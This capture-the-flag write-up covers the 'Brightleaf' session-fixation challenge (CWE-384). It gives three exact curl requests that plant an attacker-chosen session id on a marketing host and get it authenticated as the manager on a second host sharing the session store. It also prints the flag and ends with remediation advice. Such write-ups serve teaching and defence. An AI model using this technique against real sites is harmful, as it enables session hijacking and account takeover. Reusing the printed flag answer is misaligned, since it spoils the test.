# Brightleaf - cross-host session fixation (attacker-chosen sid, shared store)

| | |
|---|---|
| **Challenge** | Brightleaf |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth6.chal.deti:8065 (+ http://marketing.auth6.chal.deti:8065) |
| **Auth weakness** | CWE-384 - session fixation across two hosts sharing a session store |

## Hint
> Two houses, one key cut too wide for just one door - it opens them both.

## Recon
Two "houses" backed by the **same session store**:

- **Manager house** - `auth6.chal.deti:8065`: console at `/dashboard`;
  `/helpdesk/verify-link` takes a **`sid`** and "signs in with the manager's own
  credentials" on it.
- **Marketing house** - `marketing.auth6.chal.deti:8065`: `/plant` form whose
  field is literally **`sid`** ("Your display name") - i.e. **you choose your
  own session id**, and it's "remembered across all of Brightleaf."

The `/plant` cookie is host-only (`sid=...; Path=/`, no `Domain=`), but the
*backend session store is shared*, so a sid registered on marketing is valid on
the manager host - you just have to send the cookie there yourself.

## Approach
CWE-384: the attacker fully controls the session identifier (pick it on the
marketing side), and the manager link-checker binds manager auth to **any sid
you submit** without issuing a fresh one.

1. `/plant` on marketing with a chosen `sid` → registers it in the shared store.
2. Submit that `sid` to the manager `/helpdesk/verify-link` → manager signs into it.
3. Present `sid` **explicitly** to the manager `/dashboard` (cookie is host-only,
   so set it by hand) → flag.

## Exploitation - the exact requests
```bash
# 1. choose + register a session id on the marketing house
curl -s -d 'sid=pwn7391' http://marketing.auth6.chal.deti:8065/plant

# 2. manager link-checker signs the manager into OUR sid
curl -s -d 'sid=pwn7391' http://auth6.chal.deti:8065/helpdesk/verify-link    # -> "Link verified."

# 3. present the sid to the manager host explicitly (store is shared across houses)
curl -s -b 'sid=pwn7391' http://auth6.chal.deti:8065/dashboard | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{392653e6d4aadb920d9d63f0858256b1}
```

## Root cause & remediation
- **Cause:** the session id is attacker-chosen and shared across two hosts via a
  common session store (CWE-384); the helpdesk authenticates an arbitrary,
  caller-supplied sid instead of regenerating one at login.
- **Fix:** never let clients set the session identifier; regenerate the sid on
  authentication; scope sessions per-application (separate stores / signed,
  audience-bound tokens) so a marketing-side session can't authenticate the
  manager console.
